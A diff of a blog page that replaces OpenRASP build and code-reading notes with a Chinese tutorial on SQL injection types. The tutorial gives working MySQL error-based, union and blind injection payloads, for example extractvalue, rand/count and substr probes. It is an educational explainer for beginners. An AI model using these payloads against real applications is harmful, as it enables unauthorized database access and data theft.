@@ -10,7 +10,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
 <meta property="og:title" content="turn1tup&#39;s blog">
-<meta property="og:url" content="https://turn1tup.github.io/page/14/index.html">
+<meta property="og:url" content="https://turn1tup.github.io/page/22/index.html">
 <meta property="og:site_name" content="turn1tup&#39;s blog">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="turn1tup">
@@ -152,222 +152,146 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-OpenRASP学习笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-SQL注入类型详解" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">OpenRASP学习笔记</a>
+      <a class="article-title" href="/2018/01/25/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/">SQL注入类型详解</a>
     </h1>
   
 
         
-        <a href="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2020-09-06T17:51:28.223Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-06</time>
+        <a href="/2018/01/25/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/" class="archive-article-date">
+  	<time datetime="2018-01-26T05:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-25</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1.引言"></a>1.引言</h1><p>最近看了看OpenRASP（JAVA版），而网上关于OpenRASP已有一些文章，但纸上得来终觉浅，自己阅读一番再另外写篇文章，也还行，算是总结算是笔记。如文中有错误，还望同学们指出，十分感谢。</p>
-<h1 id="2-阅读前准备工作"><a href="#2-阅读前准备工作" class="headerlink" title="2.阅读前准备工作"></a>2.阅读前准备工作</h1><p>一开始还需要将open-rasp安装到Tomcat，这里按照官方文档指引即可。</p>
-<h2 id="2-1编译"><a href="#2-1编译" class="headerlink" title="2.1编译"></a>2.1编译</h2><h3 id="编译V8引擎"><a href="#编译V8引擎" class="headerlink" title="编译V8引擎"></a>编译V8引擎</h3><p>笔者在这里花了半天时间，一度十分懵逼，不懂C++编译这块的东西，按照官方文档来弄又不得行。</p>
-<p>笔者的编译环境</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Debian 4.9.18 (kali)</span><br><span class="line">OpenJDK 1.8</span><br><span class="line">gcc version 8.3.0</span><br></pre></td></tr></table></figure>
-
-<p>编译获取v8引擎jar包：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">curl -L  https:&#x2F;&#x2F;github.com&#x2F;Kitware&#x2F;CMake&#x2F;releases&#x2F;download&#x2F;v3.15.3&#x2F;cmake-3.15.3-Linux-x86_64.tar.gz | tar zx -C &#x2F;tmp</span><br><span class="line">export PATH&#x3D;&#x2F;tmp&#x2F;cmake-3.15.3-Linux-x86_64&#x2F;bin:$PATH</span><br><span class="line"></span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;baidu-security&#x2F;openrasp-v8.git</span><br><span class="line">~&#x2F;openrasp-v8# mkdir -p openrasp-v8&#x2F;build64 &amp;&amp; cd openrasp-v8&#x2F;build64</span><br><span class="line">~&#x2F;openrasp-v8&#x2F;openrasp-v8# cmake -DCMAKE_BUILD_TYPE&#x3D;RelWithDebInfo -DENABLE_LANGUAGES&#x3D;java ..</span><br><span class="line">~&#x2F;openrasp-v8&#x2F;openrasp-v8# make</span><br><span class="line">~&#x2F;openrasp-v8&#x2F;openrasp-v8# mkdir -p ..&#x2F;java&#x2F;src&#x2F;main&#x2F;resources&#x2F;natives&#x2F;linux_64 &amp;&amp; cp java&#x2F;libopenrasp_v8_java.so $_</span><br><span class="line">~&#x2F;openrasp-v8&#x2F;java# mvn install</span><br></pre></td></tr></table></figure>
-
-<h3 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h3><p>本文使用的是<code>1.3.4</code>版本。</p>
-<p>Injellij IDEA打开 \openrasp-master\agent\java</p>
-<p>Help &gt; Find Action ，输入并打开 <code>Maven Project</code></p>
-<p>由于V8是在虚拟机上编译的，不在本地物理机的maven仓库中，需要先将其加入仓库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install:install-file -Dfile&#x3D;D:\share\v8-1.0-SNAPSHOT.jar -DgroupId&#x3D;com.baidu.openrasp -DartifactId&#x3D;v8 -Dpackaging&#x3D;jar -Dversion&#x3D;1.0-SNAPSHOT</span><br></pre></td></tr></table></figure>
-
-<p>编译<code>rasp-boot</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/compile.png" alt></p>
-<p>由于<code>rasp-engine</code>依赖<code>rasp-boot</code>，所以需要将<code>rasp-boot</code>加入到maven仓库中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mvn install:install-file -Dfile&#x3D;D:\turn1tup\program_java\RASP\openrasp\agent\java\boot\target\rasp-boot-1.3.4-shaded.jar -DgroupId&#x3D;com.baidu.openrasp -DartifactId&#x3D;rasp-boot -Dpackaging&#x3D;jar -Dversion&#x3D;1.3.4</span><br></pre></td></tr></table></figure>
-
-<p>同样操作编译<code>rasp-engine</code>即可。</p>
-<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>Windows下，在Tomcat的catalina.bat的open-rasp配置后添加一行JDWP配置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if &quot;%ACTION%&quot; &#x3D;&#x3D; &quot;start&quot; set JAVA_OPTS&#x3D;&quot;-javaagent:%CATALINA_HOME%\rasp\rasp.jar&quot; %JAVA_OPTS%</span><br><span class="line">if &quot;%ACTION%&quot; &#x3D;&#x3D; &quot;start&quot; set JAVA_OPTS&#x3D;-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,address&#x3D;1043,server&#x3D;y,suspend&#x3D;y %JAVA_OPTS%</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/idea_remote_debug.png" alt></p>
-<p>IDEA中将编译后的JAR包加入到项目Libraries，随后配置远程调试</p>
-<p>断点打到程序最开始执行的地方，从最开始的地方看起。</p>
-<p>openrasp\agent\java\boot\src\main\java\com\baidu\openrasp\Agent.java</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Agent_premain.png" alt></p>
-<h1 id="3-工作原理"><a href="#3-工作原理" class="headerlink" title="3.工作原理"></a>3.工作原理</h1><p>这块技术之前没接触过，笔者翻阅了前辈们写的文章与官方文档，大致了解了一番，这里也简单叙述一下。</p>
-<h2 id="JVM-TI接口"><a href="#JVM-TI接口" class="headerlink" title="JVM TI接口"></a>JVM TI接口</h2><p>JAVA虚拟机开放了一个叫 JVM Tool Interface (JVM TI)  的接口，通过该接口，对于运行于JVM的程序，我们可以查看和控制。</p>
-<p>实现了JVM TI接口的程序，称为agent，agent与jvm运行在同一进程并直接与jvm进行通信。agent能通过三种方式被执行，①Agent Start-Up (OnLoad phase)：在JAVA程序的main函数执行之前执行agent，java命令中需通过-javaagent参数来指定agent，实现方式为premain ②Agent Start-Up (Live phase) ：对于正在运行的JAVA程序，通过JVM进程间通信，动态加载agent，实现方式为attatch机制 ③Agent Shutdown：在虚拟机的library 将要被卸载时执行，该方式忽略。</p>
-<p>OpenRASP实现了前面两种加载方式，在比较第一种与第二种方式的优劣势时，<a href="https://www.anquanke.com/post/id/187415" target="_blank" rel="noopener">浅谈RASP</a>文中说明到，attatch机制由于JVM本身的进程保护机制，会导致重复字节码的插入问题，造成重复告警，增加业务压力，而解决该问题的方法又另外会带来业务压力。</p>
-<h2 id="字节码操作"><a href="#字节码操作" class="headerlink" title="字节码操作"></a>字节码操作</h2><h3 id="ASM"><a href="#ASM" class="headerlink" title="ASM"></a>ASM</h3><p>备注：OpenRASp使用的Javaassit。</p>
-<p>通过agent，我们可以访问与修改JVM中的JAVA类，这时候获取到的相关的数据为JAVA字节码，通常通过asm字节码操作框架进行字节码操作。</p>
-<p>引用<a href="https://www.anquanke.com/post/id/187415" target="_blank" rel="noopener">浅谈RASP</a>中对ASM的说明：</p>
+        <p>该文章首发于信安之路</p>
+<p>https:/mp.weixin.qq.com/s/BQVS7alMSdy3_SQuMymkug</p>
+<p>笔者最初学习 SQL 注入时，大家对于 SQL 注入类型的归类让我头脑一片混乱，后来笔者发现其实大家都是根据 sqlmap 上给出的“类型”来划分的。所以，今天在这里，笔者根据自己所学所知来对 SQL 注入进行一个分类，以及讲解一些在注入时十分重要而有用的知识，相信对初学者十分有用。</p>
+<p>本文主要使用 MySQL 来进行讲解，且重点是对整个 SQL 注入类型的探讨，以及在这些注入类型中的一些重要细节的讲解，所以不会过多讲解 SQL 语句具体语法语意等。</p>
+<p>我们知道，Sqlmap 有个参数可以直接指定注入时所用的类型：</p>
 <blockquote>
-<p>通过该图可以清晰的看出调用顺序，对于新手来说可以简单的理解为下面这样的调用顺序：</p>
-<ul>
-<li>需要访问类，所以要声明ClassReader，来“获取”类。</li>
-<li>如果需要对类中的内容进行修改，就需要声明ClassWriter它是继承于ClassReader的。</li>
-<li>然后实例化“访问者”ClassVisitor来进行类访问，至此就以“访问者”的身份进入了类，你可以进行以下工作：<ul>
-<li>如果需要访问注解，则实例化AnnotationVisitor</li>
-<li>如果需要访问参数，则实例化FieldVisitor</li>
-<li>如果需要访问方法，则实例化MethodVisitro</li>
-</ul>
-</li>
-</ul>
+<p><code>--technique=BEISTQU</code> [ <code>Boolean-based blind</code>, <code>Error-based queries, Inline queries</code>, <code>Stacked queries</code>, <code>Time-based blind</code>, <code>UNION query</code> ]</p>
 </blockquote>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/asm.png" alt></p>
-<h3 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h3><p>引用 <a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html" target="_blank" rel="noopener">字节码增强技术探索</a></p>
+<p>但从实际的逻辑思路上来说，这样划分是难以理解的，BEUSTQU 是注入方式，和类型其实没有什么关系，理解这点很重要。</p>
+<p>在说 SQLI 时，首先要注意的一个要点就是判断注入位置的参数属性类型。注入位置的参数属性类型有整形和字符型，区分二者的真正意义是，整形参数之后跟的语句不必”打破变量区”，即我们在这里输入字符即可被作为 SQL 语句的一部分了。有的时候 web 开发者仅对用户输入进行了转义，而没注意一些整形参数的处理，在这种情况下就可以直接注入了。</p>
+<p>第二个要点就是，注入时所用的 <code>HTTP Request</code> 报文类型，是 GET、POST 或其他。</p>
+<p>第三个要点就是，注入点在 <code>HTTPRequest</code> 报文中的位置所在。如 HTTP 报文的头部字段，包括 Cookie、User-Agent 等，也可能发生 SQL 注入，如开发者记录用户浏览器类型到数据库，这个时候使用的是 User-Agent 头部字段，如果开发者十分大意，可能就发生注入了。</p>
+<p>sqlmap 等级 2 会检测 Cookie，等级 3 会测试 User-Agent、Referer，等级 5 会检测 host。</p>
+<h3 id="First-order-Injection"><a href="#First-order-Injection" class="headerlink" title="First order Injection"></a>First order Injection</h3><p>第一大类型，由于都是翻译的，笔者更喜欢叫它一级注入。一级注入发生在应用与用户交互的地方，web 应用获取到的用户的信息都可能发生注入</p>
+<h4 id="In-band-SQLi"><a href="#In-band-SQLi" class="headerlink" title="In-band SQLi"></a>In-band SQLi</h4><p>第一大类型中的第一个类型叫“带内 SQL 注入”，就是说攻击者可以直接与受害主机发生交互，面对面一样的。有人比喻成，攻击者与受害服务器之间有一条“信息通道”，通过这条通道攻击者可以获取到想要的信息。</p>
+<p><strong>Union Select SQLi （直接回显）</strong> </p>
+<p>联合查询 SQL 注入，这是最简单的注入类型，通常在通过 <code>order by</code> 判断 SQL 语句查询结果的列数后，使用 <code>union select</code> 或其他语句来直接查询数据，数据直接回显。</p>
+<p>可以根据下面的语句来理解该类型注入：</p>
+<p><img src="/2018/01/25/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/1.png" alt="img"></p>
+<p><strong>Error-basedSQLi</strong></p>
+<p>中文为 “报错型 SQL 注入”，攻击者不能直接从页面得到他们的查询语句的执行结果，但通过一些特殊的方法却可以回显出来，带有一点盲注的味道。报错型注入，一般是通过特殊的数据库函数引发错误信息，而错误的回显信息又把这些查询信息给泄漏出来了。</p>
+<p>Mysql 的报错函数有12种之多（只是看过然后收集，并无验证），但实际上可能只需要熟悉两三种即可，对过 WAF 可能会有帮助。下面列出我常用的两种方法：</p>
+<p>1、<code>extractvalue</code> 函数。</p>
+<p>语句跟在 <code>AND/OR/||/&amp;&amp;</code> 后面</p>
 <blockquote>
-<p>ASM是在指令层次上操作字节码的，阅读上文后，我们的直观感受是在指令层次上操作字节码的框架实现起来比较晦涩。故除此之外，我们再简单介绍另外一类框架：强调源代码层次操作字节码的框架Javassist。</p>
-<p>利用Javassist实现字节码增强时，可以无须关注字节码刻板的结构，其优点就在于编程简单。直接使用java编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构或者动态生成类。其中最重要的是ClassPool、CtClass、CtMethod、CtField这四个类：</p>
-<ul>
-<li>CtClass（compile-time class）：编译时类信息，它是一个class文件在代码中的抽象表现形式，可以通过一个类的全限定名来获取一个CtClass对象，用来表示这个类文件。</li>
-<li>ClassPool：从开发视角来看，ClassPool是一张保存CtClass信息的HashTable，key为类名，value为类名对应的CtClass对象。当我们需要对某个类进行修改时，就是通过pool.getCtClass(“className”)方法从pool中获取到相应的CtClass。</li>
-<li>CtMethod、CtField：这两个比较好理解，对应的是类中的方法和属性。</li>
-</ul>
-<p>了解这四个类后，我们可以写一个小Demo来展示Javassist简单、快速的特点。我们依然是对Base中的process()方法做增强，在方法调用前后分别输出”start”和”end”，实现代码如下。我们需要做的就是从pool中获取到相应的CtClass对象和其中的方法，然后执行method.insertBefore和insertAfter方法，参数为要插入的Java代码，再以字符串的形式传入即可，实现起来也极为简单。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">import</span> com.meituan.mtrace.agent.javassist.*;</span><br><span class="line"></span><br><span class="line">&gt;<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavassistTest</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IllegalAccessException, InstantiationException, IOException </span>&#123;</span><br><span class="line">       ClassPool cp = ClassPool.getDefault();</span><br><span class="line">       CtClass cc = cp.get(<span class="string">"meituan.bytecode.javassist.Base"</span>);</span><br><span class="line">       CtMethod m = cc.getDeclaredMethod(<span class="string">"process"</span>);</span><br><span class="line">       m.insertBefore(<span class="string">"&#123; System.out.println(\"start\"); &#125;"</span>);</span><br><span class="line">       m.insertAfter(<span class="string">"&#123; System.out.println(\"end\"); &#125;"</span>);</span><br><span class="line">       Class c = cc.toClass();</span><br><span class="line">       cc.writeFile(<span class="string">"/Users/zen/projects"</span>);</span><br><span class="line">       Base h = (Base)c.newInstance();</span><br><span class="line">       h.process();</span><br><span class="line">   &#125;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>
+<p>or 1 and extractvalue(1, concat(0x3a, (select @@version),0x3a))</p>
 </blockquote>
-<h1 id="4-实现"><a href="#4-实现" class="headerlink" title="4.实现"></a>4.实现</h1><h2 id="4-1框架逻辑"><a href="#4-1框架逻辑" class="headerlink" title="4.1框架逻辑"></a>4.1框架逻辑</h2><p>这里就偷懒不写了，直接上官方链接：</p>
-<p><a href="https://rasp.baidu.com/doc/hacking/architect/java.html" target="_blank" rel="noopener">https://rasp.baidu.com/doc/hacking/architect/java.html</a></p>
-<h2 id="4-2-代码逻辑"><a href="#4-2-代码逻辑" class="headerlink" title="4.2 代码逻辑"></a>4.2 代码逻辑</h2><h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>rasp.jar的MANIFEST.MF文件：</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/rasp.jar_manifest.mf.png" alt></p>
-<p>rasp-engine.jar：</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/rasp-engine.jar_manifest.mf.png" alt></p>
-<h3 id="1-premain"><a href="#1-premain" class="headerlink" title="1 premain"></a>1 premain</h3><p>从premain启动的OnLoad phase方式，调用了init进行了如下操作：addJarToBootstrap（打破双亲委派机制）、readVersion、启动engine。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">堆栈信息：</span><br><span class="line">init:92, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">loadClassAndStartAgent:386, InstrumentationImpl (sun.instrument)</span><br><span class="line">loadClassAndCallPremain:401, InstrumentationImpl (sun.instrument)</span><br></pre></td></tr></table></figure>
-
-<p><code>init:92, Agent (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Agent_init.png" alt></p>
-<p><code>premain:71, Agent (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Agent_premain.png" alt></p>
-<p>另外没看懂attach方式（agentmain）是怎么实现的，有点奇怪，先放着，后面再回顾。</p>
-<h3 id="1-1-打破双亲委派机制"><a href="#1-1-打破双亲委派机制" class="headerlink" title="1-1 打破双亲委派机制"></a>1-1 打破双亲委派机制</h3><p>将rasp.jar添加到BootstrapClassLoader，这样做是由于双亲委派机制的存在，类加载器在加载类时无法往下委派加载。用户自定义的类使用的类加载器SystemClassLoader。而当被hook的类需要去调用检测方法，如果该hook类为BootstrapClassLoader加载的，则无法成果调用该检测方法。官方文档也有说明：</p>
+<p>还有下面的骚操作，注入点发生在 sql 语句的 limit 整形参数里，可以直接跟在整形参数后面（来自 hackinglab）</p>
 <blockquote>
-<p>当去 hook 像 java.io.File 这样由 BootstrapClassLoader 加载的类的时候，无法从该类调用非 BootstrapClassLoader 加载的类中的接口，所以 agent.jar 会先将自己添加到 BootstrapClassLoader 的ClassPath下，这样 hook 由 BootstrapClassLoader 加载的类的时候就能够成功调用到 agent.jar 中的检测入口</p>
+<p>?start=0 procedure analyse(extractvalue(rand(),concat(1,(select @@version))),1)</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addJarToBootstrap:40, JarFileHelper (com.baidu.openrasp)</span><br><span class="line">init:92, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
+<p>2、<code>rand+count</code> 函数，与 union 结合，与 <code>AND/OR/||/&amp;&amp;</code> 结合都可以，十分灵活。</p>
+<blockquote>
+<p>union select count(<em>),concat(0x3a,0x3a,(select @@version),0x3a,0x3a,floor(rand()</em>2))a from information_schema.columns group by a;</p>
+</blockquote>
+<blockquote>
+<p>AND(select 1 from (select count(<em>),concat(0x3a,0x3a,(select @@version),0x3a,0x3a,floor(rand()</em>2))a from mysql.user group by a)b)</p>
+</blockquote>
+<p><strong>Blind SQLi ( Inferential SQLi )</strong></p>
+<p>盲注也叫逻辑推理注入，在这里，攻击者不能得到数据库错误的回显信息，也不能得到查询结果的回显信息，但可以通过其他信息来进行逻辑推理从而获取数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Boolean-basedSQLi</span><br></pre></td></tr></table></figure>
 
-<p><code>addJarToBootstrap:40, JarFileHelper (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/addJarToBootstrap.png" alt></p>
-<h3 id="1-2-1-装载engine"><a href="#1-2-1-装载engine" class="headerlink" title="1-2-1 装载engine"></a>1-2-1 装载engine</h3><p>使用moduleClassLoader（ExtClassLoader）装载rasp-engine.jar，并且将EngineBoot实例化，赋值给module变量，为后续启动rasp模块做准备。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:54, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:88, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
+<p>布尔型注入，构造一条布尔语句通过 AND 与前面进行逻辑上的连接，当这条布尔语句为真时，页面应该显示正常，当这条语句为假时，页面显示不正常或是少显示了一些东西。值得注意的是，在实际中，布尔值假时的表现可能为 <code>HTTP 500</code>，真时的表现为 <code>HTTP 200</code>，以及还有其他各种情况，这也是逻辑推理的真谛。</p>
+<p>还有一些细节值得注意，计算机语言的逻辑判断中，通常 AND 的优先级大于 OR，且对布尔值判断时，如果 or 的左边为真时，右边是不会执行的，而对于 AND，如果左边布尔值为假，右边也会跳过而不会执行。</p>
+<p>MySQL 有点神奇，似乎对它不影响，但是我们还是要养成好习惯；而在 mssql 与 oracle 这是要注意的，具体如下图：</p>
+<p><img src="/2018/01/25/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/2.jpg" alt="img"></p>
+<p><img src="https:/mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffuiaibN49MdKZ4BYWPLcYYgqBEz26l46BBccMALbZgYc573a9FhZ3Ozriaxkh3V3GAiaOqMGGbNQwfNw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p>
+<p><img src="/2018/01/25/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/3.webp.jpg" alt="img"></p>
+<p>使用布尔型盲注来获取 MySQL 数据库数据，如查询数据库名的第一个字节的 ASCII 码十进制值是否大于 100，有如下语句：</p>
+<blockquote>
+<p>and ascii(substr(database(),1,1))&gt;100</p>
+</blockquote>
+<p>或是使用 like 的方法：</p>
+<blockquote>
+<p>and substr(database(),1,1) like ‘m’</p>
+</blockquote>
+<blockquote>
+<p>and substr(database(),1,2) like ‘my’</p>
+</blockquote>
+<p>还可以使用“突破延迟注入”的方法，因为延迟注入与布尔型注入本质上是一样的，所以这个方法在这里也可以使用，如有兴趣可以查看 FreeBuf 的公开课。</p>
+<p>还要说明一个重要的问题，PHP 与 MySQL 都是弱类型语言，在 MySQL 中你可以有 </p>
+<blockquote>
+<p>select passwd from users where username=’xx’ or 1</p>
+</blockquote>
+<p>但是在 MSSQL、Oracle 中是</p>
+<blockquote>
+<p>select passwd from users where username=’xx’ or 1=1</p>
+</blockquote>
+<p>好好体会思考 MySQL 的“弱”。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Time-based SQLi</span><br></pre></td></tr></table></figure>
 
-<p><code>&lt;init&gt;:54, ModuleContainer (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ModuleContainer_static_code.png" alt></p>
-<p><code>&lt;init&gt;:88, ModuleLoader (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ModuleLoader_construct.png" alt></p>
-<h3 id="1-2-2-启动engine"><a href="#1-2-2-启动engine" class="headerlink" title="1-2-2 启动engine"></a>1-2-2 启动engine</h3><p>ModuleContainer调用了rasp-engine.jar的入口类EngineBoot 的start方法，start方法中进行了如下操作：加载V8引擎、加载配置与基线检测、初始化插件系统、检测器初始化、插桩、云管理初始化。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start:49, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>start:49, EngineBoot (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/EngineBoot_start.png" alt></p>
-<h3 id="1-2-2-1-加载V8引擎"><a href="#1-2-2-1-加载V8引擎" class="headerlink" title="1-2-2-1 加载V8引擎"></a>1-2-2-1 加载V8引擎</h3><p>加载V8 JS引擎，V8为native实现，本文这里不关注，具体代码在<a href="https://github.com/baidu-security/openrasp-v8" target="_blank" rel="noopener">openrasp-v8</a>。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">load:9, Loader (com.baidu.openrasp.v8)</span><br><span class="line">start:57, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-2-2-2-加载配置与基线检测"><a href="#1-2-2-2-加载配置与基线检测" class="headerlink" title="1-2-2-2 加载配置与基线检测"></a>1-2-2-2 加载配置与基线检测</h3><p>大致是初始化本地日志系统，如果用户配置了syslog，则添syslog appender；还会读取用户配置<code>openrasp.yml</code>，赋值相关配置变量，包括hook类的开关等；另外会做一些安全基线检测。这里不是关注点，不多描述。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">loadConfigFromFile:207, Config (com.baidu.openrasp.config)</span><br><span class="line">init:144, Config (com.baidu.openrasp.config)</span><br><span class="line">&lt;clinit&gt;:124, Config (com.baidu.openrasp.config)</span><br><span class="line">setLogMaxBackup:234, DynamicConfigAppender (com.baidu.openrasp.cloud.syslog)</span><br><span class="line">initLog4jLogger:133, DynamicConfigAppender (com.baidu.openrasp.cloud.syslog)</span><br><span class="line">ConfigFileAppender:36, LogConfig (com.baidu.openrasp.messaging)</span><br><span class="line">loadConfig:118, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:63, EngineBoot 